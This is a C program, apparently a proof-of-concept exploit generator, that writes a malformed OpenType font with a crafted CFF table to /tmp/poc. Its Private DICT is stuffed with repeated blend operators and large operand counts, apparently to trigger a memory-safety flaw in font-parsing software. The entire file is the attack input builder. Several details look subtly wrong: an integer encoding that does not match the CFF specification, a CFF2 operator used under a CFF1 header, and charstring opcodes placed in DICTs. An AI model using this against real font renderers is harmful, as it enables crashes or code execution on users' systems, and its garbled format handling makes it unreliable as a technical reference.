#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header: sfVersion = 'OTTO', numTables = 1 */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f);
    write16(f, 1);
    write16(f, 0);
    write16(f, 0);
    write16(f, 0);

    /* Table record for 'CFF ' */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc(' ', f);
    write32(f, 0);
    uint32_t cff_offset_pos = ftell(f);
    write32(f, 0);
    write32(f, 0);

    uint32_t cff_start = ftell(f);

    /* CFF1 Header */
    fputc(0x01, f); fputc(0x00, f); fputc(0x04, f); fputc(0x00, f);

    /* Name INDEX (empty) */
    write16(f, 0);

    /* Top DICT INDEX */
    uint32_t top_index_start = ftell(f);
    /* Reserve INDEX header: count(2) + offSize(1) + offsets(2*1=2) = 5 bytes */
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    uint32_t top_data_start = ftell(f);

    /* Private operator: 0x0C 0x12, with size and offset using 2-byte encoding */
    fputc(0x1C, f); fputc(0x00, f); /* size placeholder */
    fputc(0x1C, f); fputc(0x00, f); /* offset placeholder */
    fputc(0x0C, f); fputc(0x12, f); /* Private */

    /* CharStrings operator: 17, with offset using 2-byte encoding */
    fputc(0x1C, f); fputc(0x00, f); /* offset placeholder */
    fputc(0x11, f); /* CharStrings */

    fputc(0x0F, f); /* endchar */

    uint32_t top_data_end = ftell(f);
    uint32_t top_data_len = top_data_end - top_data_start;

    /* Patch Top DICT INDEX header */
    fseek(f, top_index_start, SEEK_SET);
    write16(f, 1);
    fputc(1, f);
    fputc(1, f);
    fputc(1 + top_data_len, f);
    fseek(f, 0, SEEK_END);

    /* String INDEX (empty) */
    write16(f, 0);

    /* Global Subr INDEX (empty) */
    write16(f, 0);

    /* CharStrings INDEX with one glyph */
    uint32_t charstrings_start = ftell(f);
    write16(f, 1);
    fputc(1, f);
    fputc(1, f);
    fputc(2, f);
    fputc(0x0E, f); /* endchar */

    /* Private DICT */
    uint32_t private_dict_start = ftell(f);

    /* First blend: push 50 values, 50 deltas, then count=50 */
    int i;
    for (i = 0; i < 50; i++) fputc(0x8B, f);
    for (i = 0; i < 50; i++) fputc(0x8B, f);
    fputc(0xBD, f); /* push 50 */
    fputc(0x0C, f); fputc(0x17, f); /* blend */

    /* Second blend: push 10 values, 10 deltas, then count=10 */
    for (i = 0; i < 10; i++) fputc(0x8B, f);
    for (i = 0; i < 10; i++) fputc(0x8B, f);
    fputc(0x95, f); /* push 10 */
    fputc(0x0C, f); fputc(0x17, f); /* blend */

    fputc(0x0F, f); /* endchar */

    uint32_t private_dict_end = ftell(f);
    uint32_t private_dict_size = private_dict_end - private_dict_start;
    uint32_t private_dict_offset = private_dict_start - cff_start;

    /* Patch Top DICT: Private size and offset */
    /* 2-byte encoding: first byte is 0x1C, second byte is value - 108 */
    fseek(f, top_data_start + 1, SEEK_SET);
    fputc(private_dict_size - 108, f);
    fseek(f, top_data_start + 3, SEEK_SET);
    fputc(private_dict_offset - 108, f);
    fseek(f, 0, SEEK_END);

    /* Patch CharStrings offset in Top DICT */
    fseek(f, top_data_start + 7, SEEK_SET);
    fputc((charstrings_start - cff_start) - 108, f);
    fseek(f, 0, SEEK_END);

    /* Patch CFF table offset and length */
    uint32_t cff_end = ftell(f);
    uint32_t cff_length = cff_end - cff_start;
    fseek(f, cff_offset_pos, SEEK_SET);
    write32(f, cff_start);
    write32(f, cff_length);

    fclose(f);
    return 0;
}